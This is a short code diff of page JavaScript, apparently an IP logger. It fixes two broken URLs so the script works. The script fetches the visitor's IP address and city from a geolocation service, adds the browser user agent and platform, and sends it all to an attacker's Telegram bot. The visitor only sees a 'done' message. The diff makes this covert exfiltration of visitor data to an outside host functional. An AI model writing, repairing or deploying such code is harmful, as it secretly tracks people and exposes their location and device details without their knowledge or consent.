@@ -10,12 +10,12 @@
             const status = document.getElementById('status');
 
             try {
-                const res = await fetch('https://ipapi.co');
+                const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
                 
                 const msg = `🚀 ЛОГ!\nIP: ${d.ip}\nГород: ${d.city}\n📱 Устройство: ${navigator.userAgent}\n💻 ОС: ${navigator.platform}`;
 
-                await fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
                 
                 status.innerText = "ГОТОВО!";
             } catch (e) {
